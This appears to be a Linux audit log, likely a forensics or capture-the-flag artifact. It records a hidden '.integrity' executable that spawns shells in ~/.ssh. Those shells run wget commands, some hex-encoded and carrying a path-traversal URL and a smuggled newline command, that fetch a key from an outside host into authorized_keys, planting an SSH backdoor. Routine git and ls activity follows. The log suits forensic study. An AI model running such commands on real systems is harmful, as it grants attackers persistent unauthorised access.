type=SYSCALL msg=audit(1789482021.140:363): arch=c000003e syscall=59 success=yes exit=0 a0=55de501de948 a1=55de501de860 a2=55de501de880 a3=8 items=3 ppid=1512 pid=1513 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="chmod" exe="/usr/bin/chmod" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482021.140:363): argc=3 a0="chmod" a1="+x" a2="/home/Tom/.cache/.ticket-parser/.integrity"
type=CWD msg=audit(1789482021.140:363): cwd="/home/Tom/Projects/diogenes-ticket-parser"
type=PATH msg=audit(1789482021.140:363): item=0 name="/usr/bin/chmod" inode=393341 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482021.140:363): item=1 name="/usr/bin/chmod" inode=393341 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482021.140:363): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482021.140:363): proctitle=63686D6F64002B78002F686F6D652F546F6D2F2E63616368652F2E7469636B65742D7061727365722F2E696E74656772697479
type=SYSCALL msg=audit(1789482021.148:364): arch=c000003e syscall=59 success=yes exit=0 a0=55de501de808 a1=55de501de850 a2=55de501de860 a3=0 items=2 ppid=1 pid=1514 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm=".integrity" exe="/home/Tom/.cache/.ticket-parser/.integrity" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482021.148:364): argc=1 a0="/home/Tom/.cache/.ticket-parser/.integrity"
type=CWD msg=audit(1789482021.148:364): cwd="/home/Tom/Projects/diogenes-ticket-parser"
type=PATH msg=audit(1789482021.148:364): item=0 name="/home/Tom/.cache/.ticket-parser/.integrity" inode=916671 dev=08:02 mode=0100755 ouid=1000 ogid=1000 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="Tom" OGID="Tom"
type=PATH msg=audit(1789482021.148:364): item=1 name="/home/Tom/.cache/.ticket-parser/.integrity" inode=916671 dev=08:02 mode=0100755 ouid=1000 ogid=1000 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="Tom" OGID="Tom"
type=PROCTITLE msg=audit(1789482021.148:364): proctitle="/home/Tom/.cache/.ticket-parser/.integrity"
type=SYSCALL msg=audit(1789482218.544:365): arch=c000003e syscall=59 success=yes exit=0 a0=555563c8ff65 a1=555563c8f800 a2=7ffc46c9efc8 a3=0 items=3 ppid=1514 pid=1516 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sh" exe="/usr/bin/dash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482218.544:365): argc=1 a0="/bin/sh"
type=CWD msg=audit(1789482218.544:365): cwd="/home/Tom/.ssh"
type=PATH msg=audit(1789482218.544:365): item=0 name="/bin/sh" inode=393419 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482218.544:365): item=1 name="/bin/sh" inode=393430 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482218.544:365): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482218.544:365): proctitle="/bin/sh"
type=SYSCALL msg=audit(1789482400.268:366): arch=c000003e syscall=59 success=yes exit=0 a0=5642c1639aa8 a1=5642c1639830 a2=5642c1639868 a3=8 items=3 ppid=1516 pid=1520 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="wget" exe="/usr/bin/wget" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482400.268:366): argc=6 a0="wget" a1="-q" a2=2D2D6865616465723D436F6F6B69653A20582D4F70657261746F722D417574683D6E61706F6C656F6E5F6D6F72616E5F31383934 a3="-O" a4="authorized_keys" a5=687474703A2F2F426C61636B506561726C323032362E6874623A393939392F646F776E6C6F61643F66696C653D2E2E2F2E2E2F2E7373682F69645F7273612E7075620A6C73202D6C610A
type=CWD msg=audit(1789482400.268:366): cwd="/home/Tom/.ssh"
type=PATH msg=audit(1789482400.268:366): item=0 name="/usr/bin/wget" inode=421662 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482400.268:366): item=1 name="/usr/bin/wget" inode=421662 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482400.268:366): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482400.268:366): proctitle=77676574002D71002D2D6865616465723D436F6F6B69653A20582D4F70657261746F722D417574683D6E61706F6C656F6E5F6D6F72616E5F31383934002D4F00617574686F72697A65645F6B65797300687474703A2F2F426C61636B506561726C323032362E6874623A393939392F646F776E6C6F61643F66696C653D2E2E2F
type=SYSCALL msg=audit(1789482422.976:367): arch=c000003e syscall=59 success=yes exit=0 a0=555563c90585 a1=555563c90720 a2=7ffc46c9efc8 a3=0 items=3 ppid=1514 pid=1521 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sh" exe="/usr/bin/dash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482422.976:367): argc=1 a0="/bin/sh"
type=CWD msg=audit(1789482422.976:367): cwd="/home/Tom/.ssh"
type=PATH msg=audit(1789482422.976:367): item=0 name="/bin/sh" inode=393419 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482422.976:367): item=1 name="/bin/sh" inode=393430 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482422.976:367): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482422.976:367): proctitle="/bin/sh"
type=SYSCALL msg=audit(1789482788.508:368): arch=c000003e syscall=59 success=yes exit=0 a0=555563c906a5 a1=555563c8f800 a2=7ffc46c9efc8 a3=0 items=3 ppid=1514 pid=1525 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sh" exe="/usr/bin/dash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482788.508:368): argc=1 a0="/bin/sh"
type=CWD msg=audit(1789482788.508:368): cwd="/home/Tom/.ssh"
type=PATH msg=audit(1789482788.508:368): item=0 name="/bin/sh" inode=393419 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482788.508:368): item=1 name="/bin/sh" inode=393430 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482788.508:368): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482788.508:368): proctitle="/bin/sh"
type=SYSCALL msg=audit(1789482890.524:369): arch=c000003e syscall=59 success=yes exit=0 a0=5568d70d1aa8 a1=5568d70d1828 a2=5568d70d1860 a3=8 items=3 ppid=1525 pid=1528 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="wget" exe="/usr/bin/wget" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482890.524:369): argc=6 a0="wget" a1="-q" a2=2D2D6865616465723D436F6F6B69653A20582D4F70657261746F722D417574683D6E61706F6C656F6E5F6D6F72616E5F31383934 a3="-O" a4="authorized_keys" a5="http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub"
type=CWD msg=audit(1789482890.524:369): cwd="/home/Tom/.ssh"
type=PATH msg=audit(1789482890.524:369): item=0 name="/usr/bin/wget" inode=421662 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482890.524:369): item=1 name="/usr/bin/wget" inode=421662 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482890.524:369): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482890.524:369): proctitle=77676574002D71002D2D6865616465723D436F6F6B69653A20582D4F70657261746F722D417574683D6E61706F6C656F6E5F6D6F72616E5F31383934002D4F00617574686F72697A65645F6B65797300687474703A2F2F3230332E302E3131332E31303A393939392F646F776E6C6F61643F66696C653D2E2E2F2E2E2F2E7373
type=SYSCALL msg=audit(1789482943.720:370): arch=c000003e syscall=59 success=yes exit=0 a0=5568ab65a928 a1=5568ab65a850 a2=5568ab65a860 a3=8 items=3 ppid=1525 pid=1529 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482943.720:370): argc=1 a0="ls"
type=CWD msg=audit(1789482943.720:370): cwd="/home/Tom/.ssh"
type=PATH msg=audit(1789482943.720:370): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482943.720:370): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482943.720:370): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482943.720:370): proctitle="ls"
type=SYSCALL msg=audit(1789482946.380:371): arch=c000003e syscall=59 success=yes exit=0 a0=5568ab65a970 a1=5568ab65a890 a2=5568ab65a8a8 a3=8 items=3 ppid=1525 pid=1530 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482946.380:371): argc=2 a0="ls" a1="-la"
type=CWD msg=audit(1789482946.380:371): cwd="/home/Tom/.ssh"
type=PATH msg=audit(1789482946.380:371): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482946.380:371): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482946.380:371): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482946.380:371): proctitle=6C73002D6C61
type=SYSCALL msg=audit(1789483007.580:372): arch=c000003e syscall=59 success=yes exit=0 a0=56165986cb90 a1=5616598bc290 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1531 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/bin/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483007.580:372): argc=5 a0="git" a1="clone" a2="--depth" a3="1" a4="https://github.com/vinay20045/json-to-csv.git"
type=CWD msg=audit(1789483007.580:372): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789483007.580:372): item=0 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483007.580:372): item=1 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483007.580:372): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483007.580:372): proctitle=67697400636C6F6E65002D2D646570746800310068747470733A2F2F6769746875622E636F6D2F76696E617932303034352F6A736F6E2D746F2D6373762E676974
type=SYSCALL msg=audit(1789483007.592:373): arch=c000003e syscall=59 success=yes exit=0 a0=561f7d59cb80 a1=561f7d59cab8 a2=561f7d59d600 a3=7f1224fd5b28 items=3 ppid=1531 pid=1532 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483007.592:373): argc=4 a0="/usr/lib/git-core/git" a1="remote-https" a2="origin" a3="https://github.com/vinay20045/json-to-csv.git"
type=CWD msg=audit(1789483007.592:373): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789483007.592:373): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483007.592:373): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483007.592:373): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483007.592:373): proctitle=2F7573722F6C69622F6769742D636F72652F6769740072656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F76696E617932303034352F6A736F6E2D746F2D6373762E676974
type=SYSCALL msg=audit(1789483007.592:374): arch=c000003e syscall=59 success=yes exit=0 a0=55860acdeef0 a1=55860acdeda8 a2=55860acdf950 a3=7f216ccc6b28 items=3 ppid=1532 pid=1533 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git-remote-http" exe="/usr/lib/git-core/git-remote-http" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483007.592:374): argc=3 a0="/usr/lib/git-core/git-remote-https" a1="origin" a2="https://github.com/vinay20045/json-to-csv.git"
type=CWD msg=audit(1789483007.592:374): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789483007.592:374): item=0 name="/usr/lib/git-core/git-remote-https" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483007.592:374): item=1 name="/usr/lib/git-core/git-remote-https" inode=427670 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483007.592:374): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483007.592:374): proctitle=2F7573722F6C69622F6769742D636F72652F6769742D72656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F76696E617932303034352F6A736F6E2D746F2D6373762E676974
type=SYSCALL msg=audit(1789483008.232:375): arch=c000003e syscall=59 success=yes exit=0 a0=561f7d5a0340 a1=561f7d5a0178 a2=561f7d5a0a80 a3=7f1224fd5b28 items=3 ppid=1531 pid=1536 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483008.232:375): argc=8 a0="/usr/lib/git-core/git" a1="--shallow-file" a2="/home/Tom/Projects/json-to-csv/.git/shallow.lock" a3="index-pack" a4="--stdin" a5="-v" a6="--fix-thin" a7=2D2D6B6565703D66657463682D7061636B2031353331206F6E204C542D5441696E73776F727468
type=CWD msg=audit(1789483008.232:375): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789483008.232:375): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483008.232:375): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483008.232:375): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483008.232:375): proctitle=2F7573722F6C69622F6769742D636F72652F676974002D2D7368616C6C6F772D66696C65002F686F6D652F546F6D2F50726F6A656374732F6A736F6E2D746F2D6373762F2E6769742F7368616C6C6F772E6C6F636B00696E6465782D7061636B002D2D737464696E002D76002D2D6669782D7468696E002D2D6B6565703D6665
type=SYSCALL msg=audit(1789483008.264:376): arch=c000003e syscall=59 success=yes exit=0 a0=561f7d5a0e20 a1=561f7d59e618 a2=561f7d5a0a80 a3=7f1224fd5b28 items=3 ppid=1531 pid=1539 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483008.264:376): argc=9 a0="/usr/lib/git-core/git" a1="rev-list" a2="--objects" a3="--stdin" a4="--not" a5="--all" a6="--quiet" a7="--alternate-refs" a8=2D2D70726F67726573733D436865636B696E6720636F6E6E6563746976697479
type=CWD msg=audit(1789483008.264:376): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789483008.264:376): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483008.264:376): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483008.264:376): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483008.264:376): proctitle=2F7573722F6C69622F6769742D636F72652F676974007265762D6C697374002D2D6F626A65637473002D2D737464696E002D2D6E6F74002D2D616C6C002D2D7175696574002D2D616C7465726E6174652D72656673002D2D70726F67726573733D436865636B696E6720636F6E6E6563746976697479
type=SYSCALL msg=audit(1789483012.016:377): arch=c000003e syscall=59 success=yes exit=0 a0=5616599118c0 a1=5616598cf890 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1542 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483012.016:377): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789483012.016:377): cwd="/home/Tom/Projects/json-to-csv"
type=PATH msg=audit(1789483012.016:377): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483012.016:377): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483012.016:377): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483012.016:377): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789483016.124:378): arch=c000003e syscall=59 success=yes exit=0 a0=5616597d9700 a1=561659915bb0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1545 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="cat" exe="/usr/bin/cat" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483016.124:378): argc=2 a0="cat" a1="README.md"
type=CWD msg=audit(1789483016.124:378): cwd="/home/Tom/Projects/json-to-csv"
type=PATH msg=audit(1789483016.124:378): item=0 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483016.124:378): item=1 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483016.124:378): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483016.124:378): proctitle=63617400524541444D452E6D64
